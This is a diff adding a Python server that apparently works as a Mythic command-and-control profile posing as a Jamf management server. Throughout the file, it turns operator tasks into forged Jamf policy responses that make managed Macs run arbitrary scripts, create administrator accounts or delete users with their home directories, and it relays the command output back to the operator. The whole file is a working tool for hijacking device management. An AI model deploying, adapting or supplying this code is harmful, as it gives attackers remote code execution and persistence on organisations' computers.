@@ -1,0 +1,329 @@
+#!/usr/bin/env python3
+
+from sanic import Sanic
+from sanic.response import html, redirect, text, raw
+from sanic.exceptions import NotFound
+import sys
+import asyncio
+import ssl
+from pathlib import Path
+import requests
+import json
+import os
+import base64
+import uuid
+import defusedxml.ElementTree as ET
+from xml.etree.ElementTree import register_namespace
+from time import time
+
+config = {}
+
+uuid_list = []
+
+
+async def print_flush(message):
+    print(message)
+    sys.stdout.flush()
+
+
+async def server_error_handler(request, exception):
+    return html("Error: Requested URL {} not found".format(request.url), status=404, headers=config[request.app.name]['headers'])
+
+
+async def agent_message(request, **kwargs):
+    global config
+    
+    PayloadUUID = request.url.split('UUID-')[1].split('/')[0].replace('/', '')
+    uuid_present = None
+
+    try:
+        if config[request.app.name]['debug']:
+            await print_flush("agent_message request from: {} with {} and {}".format(request.url, request.cookies, request.headers))
+            await print_flush(" and URI: {}".format(request.query_string))
+        if config[request.app.name]['debug']:
+            await print_flush("Forwarding along to: {}".format(config['mythic_address']))
+        if request.method == "POST":
+            # manipulate the request if needed
+            #await MythicCallbackRPC().add_event_message(message="got a POST message")
+            raw_xml = request.body.decode()
+            xml = ET.fromstring(raw_xml)
+
+            content = xml.find('content')
+            commandType = content.find('commandType')
+
+            if commandType.text != "com.jamfsoftware.jamf.checkforpoliciesrequest" and commandType.text != "com.jamfsoftware.jamf.submitpolicylogrequest":
+                return raw("Not implemented.".encode('utf-8'), headers=config[request.app.name]['headers'], status=501)
+
+            
+
+            device = xml.find('device')
+            hardware_uuid = device.find('uuid').text
+            
+            for uuid_object in uuid_list:
+                if uuid_object["hardware_uuid"] == hardware_uuid:
+                    PayloadUUID = uuid_object["payload_uuid"]
+                    # If the device has already checked-in set this value to True
+                    uuid_present = True
+                    
+            
+            # If the device has never checked in before create a new object, replace this with a db
+            if uuid_present != True:
+                uuid_list.append({"hardware_uuid" : hardware_uuid, "payload_uuid" : PayloadUUID})
+                
+                response = initial_enrollment(request, hardware_uuid, PayloadUUID)
+                
+                base64_value = base64.b64decode(response.content).decode("utf-8")
+                response_json = json.loads(base64_value[base64_value.find('{'):])
+                new_uuid = response_json["id"]
+
+                # Ensure the most up to date UUID is stored
+                for uuid_object in uuid_list:
+                    if uuid_object["hardware_uuid"] == hardware_uuid:
+                        if uuid_object["payload_uuid"] != new_uuid:
+                            uuid_object["payload_uuid"] = new_uuid
+            else:
+                if commandType.text == "com.jamfsoftware.jamf.submitpolicylogrequest":
+                    response = parse_response(xml, PayloadUUID, request)
+                else:
+                    response = device_checkin(request, hardware_uuid, PayloadUUID, xml)
+                
+                return response
+
+        return raw(response.content, headers=config[request.app.name]['headers'], status=response.status_code)
+    
+    except Exception as e:
+        if config[request.app.name]['debug']:
+            await print_flush("error in agent_message: {}".format(str(e)))
+        return await no_match(request, NotFound)
+
+def initial_enrollment(request, hardware_uuid, PayloadUUID):
+
+    raw_body_message = (PayloadUUID + json.dumps({
+                "action": "checkin",
+                "ip": request.ip,
+                "os": "-",
+                "user": "jamf-agent",
+                "host": hardware_uuid,
+                "pid": 0,
+                "uuid": PayloadUUID
+                }))
+
+    message = raw_body_message.encode('utf-8')
+    body_message = base64.b64encode(message)
+    response = requests.post(config['mythic_address'], data=body_message, verify=False, cookies=request.cookies, headers={"Mythic": "jamfserver"})
+    return response
+
+def device_checkin(request, hardware_uuid, PayloadUUID, xml):
+
+    raw_body_message = (PayloadUUID + json.dumps({
+                "action": "get_tasking",
+                "tasking_size": 1
+                }))
+    message = raw_body_message.encode('utf-8')
+    body_message = base64.b64encode(message)
+    response = requests.post(config['mythic_address'], data=body_message, verify=False, cookies=request.cookies, headers={"Mythic": "jamfserver"})
+    
+    base64_value = base64.b64decode(response.content).decode("utf-8")
+    response_json = json.loads(base64_value[base64_value.find('{'):])
+    for task in response_json['tasks']:
+        if task['command'] == "execute_command":
+            response = execute_policy(xml, task)
+        elif task['command'] == "add_user":
+            response = add_user(xml, task)
+        elif task['command'] == "delete_user":
+            response = delete_user(xml, task)
+
+    return response
+
+
+def execute_policy(xml, task):
+    # Get the XML from the request and then add in the command to be executed
+
+
+    task_id = task['id']
+    script = json.loads(task['parameters'])['script']
+    new_timestamp = str(time()).replace('.', '')[:13]
+
+    register_namespace('-ns2', 'http://www.jamfsoftware.com/JAMFMessage')
+
+    content = xml.find('content')
+    status = content.find('status')
+    commandData = content.find('commandData')
+
+    xml.find('messageTimestamp').text = new_timestamp
+    status.find('timestamp').text = new_timestamp
+    content.find('commandType').text = 'com.jamfsoftware.jamf.checkforpoliciesresponse'
+    content.attrib['{http://www.w3.org/2001/XMLSchema-instance}type'] = 'ns2:ResponseContent'
+    
+    commandData.find('checkForPolicies').text = "REPLACE_ME"
+
+    policiesText = f"<ns2:policies><ns2:policy><ns2:policyResponseUUID>XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXX</ns2:policyResponseUUID><ns2:id>2</ns2:id><ns2:name>MYTHIC-TASK{task_id}</ns2:name><ns2:availableOffline>false</ns2:availableOffline><ns2:forceFileSharingInstalls>false</ns2:forceFileSharingInstalls><ns2:packages/><ns2:targetDrive>/</ns2:targetDrive><ns2:installAllCached>false</ns2:installAllCached><ns2:installAllSus>false</ns2:installAllSus><ns2:useSusServerId>-1</ns2:useSusServerId><ns2:scripts><ns2:script><ns2:filename>default-script-name</ns2:filename><ns2:osRequirement></ns2:osRequirement><ns2:priority>After</ns2:priority><ns2:parameters><ns2:parameter></ns2:parameter><ns2:parameter></ns2:parameter><ns2:parameter></ns2:parameter><ns2:parameter></ns2:parameter><ns2:parameter></ns2:parameter><ns2:parameter></ns2:parameter><ns2:parameter></ns2:parameter><ns2:parameter></ns2:parameter></ns2:parameters><ns2:contents>{script}</ns2:contents></ns2:script></ns2:scripts><ns2:printers/><ns2:dockItems/><ns2:accounts/><ns2:directoryBindings/><ns2:managementAccountSettings><ns2:passwordAction>doNotChange</ns2:passwordAction><ns2:password></ns2:password><ns2:randomPasswordLength>8</ns2:randomPasswordLength><ns2:managementPassword></ns2:managementPassword></ns2:managementAccountSettings><ns2:remoteAccount>jamfAdmin</ns2:remoteAccount><ns2:firmwareSettings><ns2:setEfiPassword>false</ns2:setEfiPassword><ns2:efiPassword></ns2:efiPassword><ns2:efiMode>none</ns2:efiMode></ns2:firmwareSettings><ns2:rebootSettings><ns2:noUserNoReboot>false</ns2:noUserNoReboot><ns2:noUserReboot>false</ns2:noUserReboot><ns2:noUserRebootIfRequired>true</ns2:noUserRebootIfRequired><ns2:userNoReboot>false</ns2:userNoReboot><ns2:userReboot>false</ns2:userReboot><ns2:userRebootNow>false</ns2:userRebootNow><ns2:userRebootIfRequired>true</ns2:userRebootIfRequired><ns2:rebootIn>5</ns2:rebootIn><ns2:startRebootTimerImmediately>false</ns2:startRebootTimerImmediately><ns2:message>This computer will restart in 5 minutes. Please save anything you are working on and log out by choosing Log Out from the bottom of the Apple menu.</ns2:message><ns2:alwaysDisplay>false</ns2:alwaysDisplay><ns2:rebootTo>current</ns2:rebootTo><ns2:rebootToSpecified></ns2:rebootToSpecified><ns2:rebootToNetBootServer>-1</ns2:rebootToNetBootServer><ns2:fileVault2Reboot>false</ns2:fileVault2Reboot></ns2:rebootSettings><ns2:maintenanceSettings><ns2:updateInventory>false</ns2:updateInventory><ns2:resetComputerName>false</ns2:resetComputerName><ns2:updatePrebindings>false</ns2:updatePrebindings><ns2:fixPermissions>false</ns2:fixPermissions><ns2:selfHealPackages>false</ns2:selfHealPackages><ns2:fixByHostFiles>false</ns2:fixByHostFiles><ns2:flushSystemCache>false</ns2:flushSystemCache><ns2:flushUserCache>false</ns2:flushUserCache><ns2:verifyDisk>false</ns2:verifyDisk></ns2:maintenanceSettings><ns2:softwareUpdateServers><ns2:softwareUpdateServer><ns2:id>-1</ns2:id><ns2:displayName>Default</ns2:displayName></ns2:softwareUpdateServer></ns2:softwareUpdateServers><ns2:allowUsersToDefer>false</ns2:allowUsersToDefer><ns2:availableForSelfService>false</ns2:availableForSelfService></ns2:policy></ns2:policies>"
+
+    response_text = ET.tostring(xml).decode().replace("-ns2", "ns2")
+
+    response = raw(response_text.replace("REPLACE_ME", policiesText).encode('utf-8'), headers={'JSS-Version' : '10.15.1-t1569637051', 'Jamf-Content-Encrypt-Alg' : 'None'}, status=200)
+
+    return response
+
+
+def add_user(xml, task):
+    # Get the XML from the request and then add in the command to be executed
+
+    task_id = task['id']
+    fullname = json.loads(task['parameters'])['fullname']
+    username = json.loads(task['parameters'])['username']
+    password = json.loads(task['parameters'])['password']
+    home_directory = json.loads(task['parameters'])['home_directory']
+    administrator = str(json.loads(task['parameters'])['administrator']).lower()
+    new_timestamp = str(time()).replace('.', '')[:13]
+
+    register_namespace('-ns2', 'http://www.jamfsoftware.com/JAMFMessage')
+
+    content = xml.find('content')
+    status = content.find('status')
+    commandData = content.find('commandData')
+
+    xml.find('messageTimestamp').text = new_timestamp
+    status.find('timestamp').text = new_timestamp
+    content.find('commandType').text = 'com.jamfsoftware.jamf.checkforpoliciesresponse'
+    content.attrib['{http://www.w3.org/2001/XMLSchema-instance}type'] = 'ns2:ResponseContent'
+    
+    commandData.find('checkForPolicies').text = "REPLACE_ME"
+
+    policiesText = f"<ns2:policies><ns2:policy><ns2:policyResponseUUID>XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXX</ns2:policyResponseUUID><ns2:id>7</ns2:id><ns2:name>MYTHIC-TASK{task_id}</ns2:name><ns2:availableOffline>false</ns2:availableOffline><ns2:forceFileSharingInstalls>false</ns2:forceFileSharingInstalls><ns2:packages/><ns2:targetDrive>/</ns2:targetDrive><ns2:installAllCached>false</ns2:installAllCached><ns2:installAllSus>false</ns2:installAllSus><ns2:useSusServerId>-1</ns2:useSusServerId><ns2:scripts/><ns2:printers/><ns2:dockItems/><ns2:accounts><ns2:account><ns2:username>{username}</ns2:username><ns2:action>Create</ns2:action><ns2:realname>{fullname}</ns2:realname><ns2:password>{password}</ns2:password><ns2:isAdmin>{administrator}</ns2:isAdmin><ns2:homeDirectory>{home_directory}</ns2:homeDirectory><ns2:hint></ns2:hint><ns2:picture></ns2:picture><ns2:backupHomeDirectoryTo>/Users/Deleted Users/{username}.dmg</ns2:backupHomeDirectoryTo><ns2:deleteHomeDirectory>false</ns2:deleteHomeDirectory><ns2:addUserToFileVault>false</ns2:addUserToFileVault></ns2:account></ns2:accounts><ns2:directoryBindings/><ns2:managementAccountSettings><ns2:passwordAction>doNotChange</ns2:passwordAction><ns2:password></ns2:password><ns2:randomPasswordLength>8</ns2:randomPasswordLength><ns2:managementPassword></ns2:managementPassword></ns2:managementAccountSettings><ns2:remoteAccount>jamf-admin</ns2:remoteAccount><ns2:firmwareSettings><ns2:setEfiPassword>false</ns2:setEfiPassword><ns2:efiPassword></ns2:efiPassword><ns2:efiMode>none</ns2:efiMode></ns2:firmwareSettings><ns2:rebootSettings><ns2:noUserNoReboot>false</ns2:noUserNoReboot><ns2:noUserReboot>false</ns2:noUserReboot><ns2:noUserRebootIfRequired>true</ns2:noUserRebootIfRequired><ns2:userNoReboot>false</ns2:userNoReboot><ns2:userReboot>false</ns2:userReboot><ns2:userRebootNow>false</ns2:userRebootNow><ns2:userRebootIfRequired>true</ns2:userRebootIfRequired><ns2:rebootIn>5</ns2:rebootIn><ns2:startRebootTimerImmediately>false</ns2:startRebootTimerImmediately><ns2:message>This computer will restart in 5 minutes. Please save anything you are working on and log out by choosing Log Out from the bottom of the Apple menu.</ns2:message><ns2:alwaysDisplay>false</ns2:alwaysDisplay><ns2:rebootTo>current</ns2:rebootTo><ns2:rebootToSpecified></ns2:rebootToSpecified><ns2:rebootToNetBootServer>-1</ns2:rebootToNetBootServer><ns2:fileVault2Reboot>false</ns2:fileVault2Reboot></ns2:rebootSettings><ns2:maintenanceSettings><ns2:updateInventory>false</ns2:updateInventory><ns2:resetComputerName>false</ns2:resetComputerName><ns2:updatePrebindings>false</ns2:updatePrebindings><ns2:fixPermissions>false</ns2:fixPermissions><ns2:selfHealPackages>false</ns2:selfHealPackages><ns2:fixByHostFiles>false</ns2:fixByHostFiles><ns2:flushSystemCache>false</ns2:flushSystemCache><ns2:flushUserCache>false</ns2:flushUserCache><ns2:verifyDisk>false</ns2:verifyDisk></ns2:maintenanceSettings><ns2:softwareUpdateServers><ns2:softwareUpdateServer><ns2:id>-1</ns2:id><ns2:displayName>Default</ns2:displayName></ns2:softwareUpdateServer></ns2:softwareUpdateServers><ns2:allowUsersToDefer>false</ns2:allowUsersToDefer><ns2:availableForSelfService>false</ns2:availableForSelfService></ns2:policy></ns2:policies>"
+
+    response_text = ET.tostring(xml).decode().replace("-ns2", "ns2")
+
+    response = raw(response_text.replace("REPLACE_ME", policiesText).encode('utf-8'), headers={'JSS-Version' : '10.15.1-t1569637051', 'Jamf-Content-Encrypt-Alg' : 'None'}, status=200)
+
+    return response
+
+
+def delete_user(xml, task):
+    # Get the XML from the request and then add in the command to be executed
+
+    task_id = task['id']
+    username = json.loads(task['parameters'])['username']
+    new_timestamp = str(time()).replace('.', '')[:13]
+
+    register_namespace('-ns2', 'http://www.jamfsoftware.com/JAMFMessage')
+
+    content = xml.find('content')
+    status = content.find('status')
+    commandData = content.find('commandData')
+
+    xml.find('messageTimestamp').text = new_timestamp
+    status.find('timestamp').text = new_timestamp
+    content.find('commandType').text = 'com.jamfsoftware.jamf.checkforpoliciesresponse'
+    content.attrib['{http://www.w3.org/2001/XMLSchema-instance}type'] = 'ns2:ResponseContent'
+    
+    commandData.find('checkForPolicies').text = "REPLACE_ME"
+
+    policiesText = f"<ns2:policies><ns2:policy><ns2:policyResponseUUID>XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXX</ns2:policyResponseUUID><ns2:id>7</ns2:id><ns2:name>MYTHIC-TASK{task_id}</ns2:name><ns2:availableOffline>false</ns2:availableOffline><ns2:forceFileSharingInstalls>false</ns2:forceFileSharingInstalls><ns2:packages/><ns2:targetDrive>/</ns2:targetDrive><ns2:installAllCached>false</ns2:installAllCached><ns2:installAllSus>false</ns2:installAllSus><ns2:useSusServerId>-1</ns2:useSusServerId><ns2:scripts/><ns2:printers/><ns2:dockItems/><ns2:accounts><ns2:account><ns2:username>{username}</ns2:username><ns2:action>Delete</ns2:action><ns2:realname></ns2:realname><ns2:password></ns2:password><ns2:isAdmin>false</ns2:isAdmin><ns2:homeDirectory></ns2:homeDirectory><ns2:hint></ns2:hint><ns2:picture></ns2:picture><ns2:backupHomeDirectoryTo>/Users/Deleted Users/{username}.dmg</ns2:backupHomeDirectoryTo><ns2:deleteHomeDirectory>true</ns2:deleteHomeDirectory><ns2:addUserToFileVault>false</ns2:addUserToFileVault></ns2:account></ns2:accounts><ns2:directoryBindings/><ns2:managementAccountSettings><ns2:passwordAction>doNotChange</ns2:passwordAction><ns2:password></ns2:password><ns2:randomPasswordLength>8</ns2:randomPasswordLength><ns2:managementPassword></ns2:managementPassword></ns2:managementAccountSettings><ns2:remoteAccount>jamf-admin</ns2:remoteAccount><ns2:firmwareSettings><ns2:setEfiPassword>false</ns2:setEfiPassword><ns2:efiPassword></ns2:efiPassword><ns2:efiMode>none</ns2:efiMode></ns2:firmwareSettings><ns2:rebootSettings><ns2:noUserNoReboot>false</ns2:noUserNoReboot><ns2:noUserReboot>false</ns2:noUserReboot><ns2:noUserRebootIfRequired>true</ns2:noUserRebootIfRequired><ns2:userNoReboot>false</ns2:userNoReboot><ns2:userReboot>false</ns2:userReboot><ns2:userRebootNow>false</ns2:userRebootNow><ns2:userRebootIfRequired>true</ns2:userRebootIfRequired><ns2:rebootIn>5</ns2:rebootIn><ns2:startRebootTimerImmediately>false</ns2:startRebootTimerImmediately><ns2:message>This computer will restart in 5 minutes. Please save anything you are working on and log out by choosing Log Out from the bottom of the Apple menu.</ns2:message><ns2:alwaysDisplay>false</ns2:alwaysDisplay><ns2:rebootTo>current</ns2:rebootTo><ns2:rebootToSpecified></ns2:rebootToSpecified><ns2:rebootToNetBootServer>-1</ns2:rebootToNetBootServer><ns2:fileVault2Reboot>false</ns2:fileVault2Reboot></ns2:rebootSettings><ns2:maintenanceSettings><ns2:updateInventory>false</ns2:updateInventory><ns2:resetComputerName>false</ns2:resetComputerName><ns2:updatePrebindings>false</ns2:updatePrebindings><ns2:fixPermissions>false</ns2:fixPermissions><ns2:selfHealPackages>false</ns2:selfHealPackages><ns2:fixByHostFiles>false</ns2:fixByHostFiles><ns2:flushSystemCache>false</ns2:flushSystemCache><ns2:flushUserCache>false</ns2:flushUserCache><ns2:verifyDisk>false</ns2:verifyDisk></ns2:maintenanceSettings><ns2:softwareUpdateServers><ns2:softwareUpdateServer><ns2:id>-1</ns2:id><ns2:displayName>Default</ns2:displayName></ns2:softwareUpdateServer></ns2:softwareUpdateServers><ns2:allowUsersToDefer>false</ns2:allowUsersToDefer><ns2:availableForSelfService>false</ns2:availableForSelfService></ns2:policy></ns2:policies>"
+
+    response_text = ET.tostring(xml).decode().replace("-ns2", "ns2")
+
+    response = raw(response_text.replace("REPLACE_ME", policiesText).encode('utf-8'), headers={'JSS-Version' : '10.15.1-t1569637051', 'Jamf-Content-Encrypt-Alg' : 'None'}, status=200)
+
+    return response
+
+def parse_response(xml, PayloadUUID, request):
+
+    content = xml.find('content')
+    commandData = content.find('commandData')
+    policyLog = commandData.find('submitPolicyLog')
+    events = policyLog.find('{http://www.jamfsoftware.com/JAMFMessage}events')
+    event_list = list(events.iter())
+    mythic_task_id = event_list[1].text
+    raw_script_result = event_list[4].text
+    command_result = raw_script_result.replace('Script result:', '')
+    
+    if 'MYTHIC-TASK' not in mythic_task_id:
+            response = raw("Not interested.", headers={'JSS-Version' : '10.15.1-t1569637051', 'Jamf-Content-Encrypt-Alg' : 'None'}, status=200)
+    
+    task_id = mythic_task_id.replace('Executing Policy MYTHIC-TASK', '')
+    
+    raw_body_message = (PayloadUUID + json.dumps({
+                "action": "post_response",
+                "responses": [{"task_id" : task_id, "user_output" : command_result, "completed" : True}],
+                }))
+    message = raw_body_message.encode('utf-8')
+    body_message = base64.b64encode(message)
+    
+    requests.post(config['mythic_address'], data=body_message, verify=False, cookies=request.cookies, headers={"Mythic": "jamfserver"})
+    
+    # Sending back a legitimate response to let the agent know the server acknowledged the response
+    response_body = "<?xml version='1.0' encoding='UTF-8'?><ns2:jamfMessage xmlns:ns3=\"http://www.jamfsoftware.com/JAMFCommunicationSettings\" xmlns:ns2=\"http://www.jamfsoftware.com/JAMFMessage\"><device><uuid>XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX</uuid><macAddresses><macAddress bsdName=\"en0\">XX:XX:XX:XX:XX:XX</macAddress></macAddresses></device><application>com.jamfsoftware.jamf</application><messageTimestamp>1626619857362</messageTimestamp><content xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"ns2:ResponseContent\"><uuid>XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX</uuid><commandType>com.jamfsoftware.jamf.submitpolicylogresponse</commandType><status><code>0</code><timestamp>1626619857335</timestamp></status><commandData><submitPolicyLog/></commandData></content></ns2:jamfMessage>"
+
+    response = raw(response_body, headers={'JSS-Version' : '10.15.1-t1569637051', 'Jamf-Content-Encrypt-Alg' : 'None'}, status=200)
+    return response
+
+
+if __name__ == "__main__":
+    sys.path.append("/Mythic/mythic")
+    from mythic_c2_container.C2ProfileBase import *
+    from mythic_c2_container.MythicCallbackRPC import *
+    config_file = open("config.json", 'rb')
+    main_config = json.loads(config_file.read().decode('utf-8'))
+    print("Opening config and starting instances...")
+    sys.stdout.flush()
+    # basic mapping of the general endpoints to the real endpoints
+    try:
+        config['mythic_address'] = os.environ['MYTHIC_ADDRESS']
+    except Exception as e:
+        print("failed to find MYTHIC_ADDRESS environment variable")
+        sys.stdout.flush()
+        sys.exit(1)
+    # now look at the specific instances to start
+    for inst in main_config['instances']:
+        config[str(inst['port'])] = {'debug': inst['debug'],
+                                     'headers': inst['ServerHeaders']}
+        if inst['debug']:
+            print("Debugging statements are enabled. This gives more context, but might be a performance hit")
+        else:
+            print("Debugging statements are disabled")
+        sys.stdout.flush()
+        # now to create an app instance to handle responses
+        app = Sanic(str(inst['port']))
+        app.config['REQUEST_MAX_SIZE'] = 1000000000
+        app.config['REQUEST_TIMEOUT'] = 600
+        app.config['RESPONSE_TIMEOUT'] = 600
+        app.add_route(agent_message, "/<uri:path>", methods=['GET','POST'])
+        app.add_route(agent_message, "/", methods=['GET','POST'])
+        app.error_handler.add(Exception, server_error_handler)
+        keyfile = Path(inst['key_path'])
+        certfile = Path(inst['cert_path'])
+        if keyfile.is_file() and certfile.is_file():
+            context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH)
+            context.load_cert_chain(inst['cert_path'], keyfile=inst['key_path'])
+            if inst['debug']:
+                server = app.create_server(host="0.0.0.0", port=inst['port'], ssl=context, debug=False, return_asyncio_server=True, access_log=True)
+            else:
+                server = app.create_server(host="0.0.0.0", port=inst['port'], ssl=context, debug=False, return_asyncio_server=True, access_log=False)
+            if inst['debug']:
+                print("using SSL for port {}".format(inst['port']))
+                sys.stdout.flush()
+        else:
+            if inst['debug']:
+                print("not using SSL for port {}".format(inst['port']))
+                sys.stdout.flush()
+            if inst['debug']:
+                server = app.create_server(host="0.0.0.0", port=inst['port'], debug=False, return_asyncio_server=True, access_log=True)
+            else:
+                server = app.create_server(host="0.0.0.0", port=inst['port'], debug=False, return_asyncio_server=True, access_log=False)
+        task = asyncio.ensure_future(server)
+
+    try:
+        loop = asyncio.get_event_loop()
+        def callback(fut):
+            try:
+                fetch_count = fut.result()
+            except:
+                print("port already in use")
+                sys.stdout.flush()
+                sys.exit()
+        task.add_done_callback(callback)
+        loop.run_forever()
+    except:
+        sys.exit()
+        loop.stop()                                     
